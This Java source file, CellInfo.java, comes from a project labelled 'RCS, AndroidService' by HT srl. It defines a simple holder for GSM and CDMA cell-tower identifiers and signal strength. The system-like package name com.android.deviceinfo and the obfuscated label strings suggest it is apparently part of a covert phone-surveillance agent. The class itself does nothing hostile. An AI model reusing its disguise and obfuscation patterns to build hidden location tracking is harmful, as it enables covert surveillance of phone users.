/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : CellInfo.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo;

import com.android.m.M;

public class CellInfo {
	public int mcc = -1;
	public int mnc = -1; // sid
	public int lac = -1; // nid
	public int cid = -1; // bid

	public int sid;
	public int nid;
	public int bid;

	public int rssi;
	public boolean valid;
	public boolean gsm;
	public boolean cdma;

	public void setGsm(int mcc, int mnc, int lac, int cid, int rssi) {
		gsm = true;
		cdma = false;
		valid = true;

		this.rssi = rssi;

		this.mcc = mcc;
		this.mnc = mnc;
		this.lac = lac;
		this.cid = cid;
	}

	public void setCdma(int sid, int nid, int bid, int rssi) {
		gsm = false;
		cdma = true;
		valid = true;

		this.rssi = rssi;

		this.sid = sid;
		this.nid = nid;
		this.bid = bid;

		this.mnc = sid;
		this.lac = nid;
		this.cid = bid;

	}

	@Override
	public String toString() {

		final StringBuffer mb = new StringBuffer();

		if (gsm) {
			mb.append(M.d("MCC: ") + mcc); //$NON-NLS-1$
			mb.append(M.d(" MNC: ") + mnc); //$NON-NLS-1$
			mb.append(M.d(" LAC: ") + lac); //$NON-NLS-1$
			mb.append(M.d(" CID: ") + cid); //$NON-NLS-1$
		}

		if (cdma) {
			mb.append(M.d("SID: ") + sid); //$NON-NLS-1$
			mb.append(M.d(" NID: ") + nid); //$NON-NLS-1$
			mb.append(M.d(" BID: ") + bid); //$NON-NLS-1$
		}

		return mb.toString();
	}
}
